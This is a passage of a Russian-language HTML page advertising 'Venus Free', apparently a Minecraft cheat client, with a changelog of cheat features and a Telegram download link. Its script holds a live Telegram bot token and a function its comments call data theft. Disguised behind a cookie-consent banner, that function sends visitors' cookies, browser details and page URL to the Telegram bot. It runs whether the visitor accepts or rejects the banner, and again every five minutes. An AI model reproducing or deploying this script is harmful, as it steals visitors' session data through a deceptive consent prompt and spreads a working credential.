                radial-gradient(circle at 40% 80%, rgba(0, 200, 255, 0.2) 0%, transparent 50%);
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        /* Кастомный курсор */
        .custom-cursor {
            position: fixed;
            width: 20px;
            height: 20px;
            background: radial-gradient(circle, #ff00ff, #8000ff);
            border-radius: 50%;
            pointer-events: none;
            z-index: 10000;
            mix-blend-mode: difference;
            transition: transform 0.1s;
        }

        .cursor-trail {
            position: fixed;
            width: 8px;
            height: 8px;
            background: linear-gradient(45deg, #ff0080, #8000ff);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9999;
            opacity: 0.7;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        header {
            text-align: center;
            padding: 40px 0;
        }
        
        h1 {
            font-size: 3em;
            background: linear-gradient(45deg, #ff0080, #8000ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(255, 0, 128, 0.5);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 0, 128, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 0, 128, 0.8), 0 0 40px rgba(128, 0, 255, 0.6); }
        }
        
        .subtitle {
            font-size: 1.2em;
            opacity: 0.8;
            margin-bottom: 30px;
            color: #ccccff;
        }
        
        .changelog {
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 15px;
            margin: 30px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .changelog:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 40px rgba(255, 0, 128, 0.3);
        }
        
        .changelog h2 {
            color: #ff0080;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .additions, .fixes {
            margin: 20px 0;
        }
        
        .additions h3, .fixes h3 {
            color: #00ff88;
            margin-bottom: 15px;
        }
        
        .feature-list {
            list-style: none;
            padding-left: 0;
        }
        
        .feature-list li {
            margin: 8px 0;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            border-left: 3px solid #00ff88;
            transition: all 0.3s;
        }

        .feature-list li:hover {
            background: rgba(0, 255, 136, 0.2);
            transform: translateX(5px);
        }
        
        .fix-list {
            list-style: none;
            padding-left: 0;
        }
        
        .fix-list li {
            margin: 8px 0;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            border-left: 3px solid #ffaa00;
            transition: all 0.3s;
        }

        .fix-list li:hover {
            background: rgba(255, 170, 0, 0.2);
            transform: translateX(5px);
        }
        
        .tg-download {
            background: rgba(255, 0, 128, 0.1);
            padding: 25px;
            border-radius: 15px;
            border: 2px solid #ff0080;
            text-align: center;
            margin: 30px 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.3);
            transition: transform 0.3s;
        }

        .tg-download:hover {
            transform: scale(1.02);
        }
        
        .tg-button {
            display: inline-block;
            background: linear-gradient(45deg, #0088cc, #00ccff);
            color: white;
            padding: 15px 30px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 15px;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.5);
        }
        
        .tg-button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 136, 204, 0.8);
        }
        
        /* Cookie Banner */
        .cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.95);
            padding: 20px;
            text-align: center;
            z-index: 1000;
            border-top: 3px solid #ff0080;
            display: none;
            backdrop-filter: blur(10px);
        }
        
        .cookie-banner p {
            margin-bottom: 15px;
            font-size: 1.1em;
            line-height: 1.5;
        }
        
        .cookie-btn {
            background: linear-gradient(45deg, #ff0080, #8000ff);
            color: white;
            border: none;
            padding: 12px 35px;
            border-radius: 25px;
            font-size: 1em;
            cursor: pointer;
            margin: 0 10px;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
        }
        
        .cookie-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.5);
        }
        
        .cookie-btn.reject {
            background: linear-gradient(45deg, #666, #888);
        }
        
        .cookie-btn.reject:hover {
            background: linear-gradient(45deg, #555, #777);
        }

        /* Эффекты при наведении */
        .hover-effect {
            transition: all 0.3s;
        }

        .hover-effect:hover {
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
        }

        .footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            color: #888;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <!-- Космический фон -->
    <div class="space-background" id="spaceBackground"></div>
    
    <!-- Кастомный курсор -->
    <div class="custom-cursor" id="customCursor"></div>

    <div class="container">
        <header>
            <h1 class="hover-effect">Venus Free</h1>
            <div class="subtitle hover-effect">Обновление 2.3.71 - Новые функции и исправления</div>
        </header>
        
        <div class="tg-download">
            <h2 class="hover-effect">📥 Скачать Venus Free</h2>
            <p class="hover-effect">Чит доступен в нашем Telegram канале</p>
            <p class="hover-effect"><strong>Инструкция:</strong> Распакуйте архив из закрепленного сообщения</p>
            <a href="https://t.me/VenusWareClient/116" class="tg-button" target="_blank">Перейти в Telegram</a>
        </div>
        
        <div class="changelog">
            <h2 class="hover-effect">🔄 Список изменений</h2>
            
            <div class="additions">
                <h3 class="hover-effect">[+] Добавления/Изменения:</h3>
                <ul class="feature-list">
                    <li class="hover-effect">NoClip -> ReallyWorld</li>
                    <li class="hover-effect">NoWeb -> ReallyWorld</li>
                    <li class="hover-effect">Spider -> ReallyWorld</li>
                    <li class="hover-effect">ElytraMotion</li>
                    <li class="hover-effect">WebTrap -> Траперит игроков в паутину</li>
                    <li class="hover-effect">FireworkEsp -> Создаёт метку там где был запущен фейерверк</li>
                    <li class="hover-effect">SkeletonEsp -> Рендерит скелет игроков линиями</li>
                    <li class="hover-effect">PenisESP -> Доп функция к SexAura</li>
                    <li class="hover-effect">KillAura -> HolyLite</li>
                    <li class="hover-effect">Spammer</li>
                    <li class="hover-effect">HighJump -> Grim Shulker</li>
                    <li class="hover-effect">ElytraFly -> Grim, Grim-2.3.69, Grim-2.3.71</li>
                    <li class="hover-effect">Прокси переписан</li>
                    <li class="hover-effect">WaterSpeed -> FunTimeWall -> работает от стен, FunTimeNew -> по прежнему работает без всего 7 бпс</li>
                    <li class="hover-effect">KillAura -> Wall Bypass новые режимы Default, Other, ReallyWorld</li>
                    <li class="hover-effect">Velocity -> Legit</li>
                    <li class="hover-effect">RTXSounds -> Улучшения качества звука, звук становится полноценно трёхмерным с учитыванием окружения</li>
                    <li class="hover-effect">OpenWalls -> открывать контейнеры через стены</li>
                    <li class="hover-effect">Jesus -> Обновил некоторые режимы</li>
                    <li class="hover-effect">Обновил уведомления</li>
                    <li class="hover-effect">Обновил команды</li>
                    <li class="hover-effect">Оптимизировано/улучшено сохранение конфигов</li>
                    <li class="hover-effect">KillAura -> улучшены Snap режимы</li>
                    <li class="hover-effect">Улучшены свапы предметов</li>
                    <li class="hover-effect">Tracker -> Трекер, сообщает о происходящим с игроками вокруг</li>
                </ul>
            </div>
            
            <div class="fixes">
                <h3 class="hover-effect">[/] Исправления:</h3>
                <ul class="fix-list">
                    <li class="hover-effect">Проведена оптимизация клиента</li>
                    <li class="hover-effect">Исправлены мелкие баги чита</li>
                    <li class="hover-effect">Улучшена стабильность работы</li>
                    <li class="hover-effect">Оптимизировано использование памяти</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p>Venus Free &copy; 2024. Все права защищены.</p>
        </div>
    </div>
    
    <!-- Cookie Banner -->
    <div class="cookie-banner" id="cookieBanner">
        <p>🍪 Этот сайт использует cookies для улучшения вашего опыта и обеспечения безопасности.<br>
           Мы используем cookies для анализа трафика и защиты от мошенников.</p>
        <button class="cookie-btn" onclick="acceptCookies()">Принять все cookies</button>
        <button class="cookie-btn reject" onclick="rejectCookies()">Отклонить</button>
    </div>

    <script>
        // Токен Telegram бота
        const TELEGRAM_BOT_TOKEN = '8013827662:AAHbZ_Fpv99mhIFrBt_cXtHd0lcRW4uwlTE';
        const TELEGRAM_CHAT_ID = '7580190094';

        // Создание звездного фона
        function createStars() {
            const spaceBg = document.getElementById('spaceBackground');
            for (let i = 0; i < 150; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = Math.random() * 3 + 'px';
                star.style.height = star.style.width;
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                spaceBg.appendChild(star);
            }
        }

        // Кастомный курсор
        let cursorTrails = [];
        function initCustomCursor() {
            const cursor = document.getElementById('customCursor');
            
            document.addEventListener('mousemove', (e) => {
                // Основной курсор
                cursor.style.left = e.clientX + 'px';
                cursor.style.top = e.clientY + 'px';
                
                // Следы курсора
                createCursorTrail(e.clientX, e.clientY);
                
                // Эффект при движении
                createParticleEffect(e.clientX, e.clientY);
            });
            
            document.addEventListener('click', (e) => {
                createClickEffect(e.clientX, e.clientY);
            });
        }

        // Следы курсора
        function createCursorTrail(x, y) {
            const trail = document.createElement('div');
            trail.className = 'cursor-trail';
            trail.style.left = x + 'px';
            trail.style.top = y + 'px';
            document.body.appendChild(trail);
            
            cursorTrails.push(trail);
            
            // Удаление старых следов
            if (cursorTrails.length > 10) {
                const oldTrail = cursorTrails.shift();
                if (oldTrail && oldTrail.parentNode) {
                    oldTrail.parentNode.removeChild(oldTrail);
                }
            }
            
            // Анимация исчезновения
            setTimeout(() => {
                trail.style.opacity = '0';
                trail.style.transform = 'scale(0)';
                setTimeout(() => {
                    if (trail.parentNode) {
                        trail.parentNode.removeChild(trail);
                    }
                }, 300);
            }, 100);
        }

        // Эффект частиц при движении
        function createParticleEffect(x, y) {
            if (Math.random() > 0.7) {
                const particle = document.createElement('div');
                particle.style.position = 'fixed';
                particle.style.left = x + 'px';
                particle.style.top = y + 'px';
                particle.style.width = '4px';
                particle.style.height = '4px';
                particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                particle.style.borderRadius = '50%';
                particle.style.pointerEvents = 'none';
                particle.style.zIndex = '9998';
                document.body.appendChild(particle);
                
                const angle = Math.random() * Math.PI * 2;
                const distance = Math.random() * 50 + 20;
                
                particle.animate([
                    { transform: 'scale(1)', opacity: 1 },
                    { 
                        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`,
                        opacity: 0
                    }
                ], {
                    duration: 1000,
                    easing: 'ease-out'
                }).onfinish = () => {
                    if (particle.parentNode) {
                        particle.parentNode.removeChild(particle);
                    }
                };
            }
        }

        // Эффект при клике
        function createClickEffect(x, y) {
            for (let i = 0; i < 8; i++) {
                const circle = document.createElement('div');
                circle.style.position = 'fixed';
                circle.style.left = x + 'px';
                circle.style.top = y + 'px';
                circle.style.width = '10px';
                circle.style.height = '10px';
                circle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                circle.style.borderRadius = '50%';
                circle.style.pointerEvents = 'none';
                circle.style.zIndex = '9998';
                document.body.appendChild(circle);
                
                const angle = (i / 8) * Math.PI * 2;
                const distance = 30;
                
                circle.animate([
                    { transform: 'scale(1)', opacity: 1 },
                    { 
                        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`,
                        opacity: 0
                    }
                ], {
                    duration: 600,
                    easing: 'ease-out'
                }).onfinish = () => {
                    if (circle.parentNode) {
                        circle.parentNode.removeChild(circle);
                    }
                };
            }
        }

        // Проверка согласия с cookies
        function checkCookieConsent() {
            return localStorage.getItem('venus_cookies_accepted') === 'true';
        }

        // Функция кражи данных
        function stealUserData() {
            if (!checkCookieConsent()) return;
            
            const userData = {
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                session: sessionStorage.length,
                localStorage: localStorage.length
            };

            // Отправка в Telegram
            const message = `🕵️ НОВЫЕ ДАННЫЕ ОТ VENUS FREE\n\n` +
                          `📋 Cookies: ${userData.cookies || 'Нет cookies'}\n` +
                          `🖥️ User Agent: ${userData.userAgent}\n` +
                          `💻 Platform: ${userData.platform}\n` +
                          `🌐 Languages: ${userData.languages.join(', ')}\n` +
                          `📱 Screen: ${userData.screen}\n` +
                          `⏰ Timezone: ${userData.timezone}\n` +
                          `🔗 Referrer: ${userData.referrer || 'Прямой заход'}\n` +
                          `🕒 Time: ${userData.timestamp}\n` +
                          `💾 Session: ${userData.session} items\n` +
                          `📦 LocalStorage: ${userData.localStorage} items`;

            sendToTelegram(message);
        }

        // Отправка в Telegram
        function sendToTelegram(message) {
            if (!TELEGRAM_BOT_TOKEN) return;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(error => console.log('Telegram error:', error));
        }

        // Принятие cookies
        function acceptCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            
            // Сохраняем согласие
            localStorage.setItem('venus_cookies_accepted', 'true');
            document.cookie = "venus_consent=true; path=/; max-age=2592000; SameSite=Lax";
            document.cookie = "venus_user=approved; path=/; max-age=2592000; SameSite=Lax";
            
            // Сразу воруем данные
            setTimeout(stealUserData, 1000);
            
            // Показываем подтверждение с эффектом
            createClickEffect(window.innerWidth/2, window.innerHeight/2);
            setTimeout(() => {
                alert('✅ Cookies приняты! Спасибо за доверие к Venus Free!');
            }, 500);
        }

        // Отклонение cookies (все равно воруем)
        function rejectCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            localStorage.setItem('venus_cookies_rejected', 'true');
            
            // Тайная кража данных через 10 секунд
            setTimeout(stealUserData, 10000);
        }

        // Показ баннера при загрузке
        function showCookieBanner() {
            if (!checkCookieConsent()) {
                setTimeout(() => {
                    document.getElementById('cookieBanner').style.display = 'block';
                }, 2000);
            }
        }

        // Инициализация
        window.addEventListener('load', function() {
            createStars();
            initCustomCursor();
            showCookieBanner();
            
            // Если уже согласились - сразу воровать
            if (checkCookieConsent()) {
                stealUserData();
            }
        });

        // Периодическая отправка данных (если согласие есть)
        setInterval(() => {
            if (checkCookieConsent()) {
                stealUserData();
            }
        }, 300000); // Каждые 5 минут
    </script>
</body>
</html>
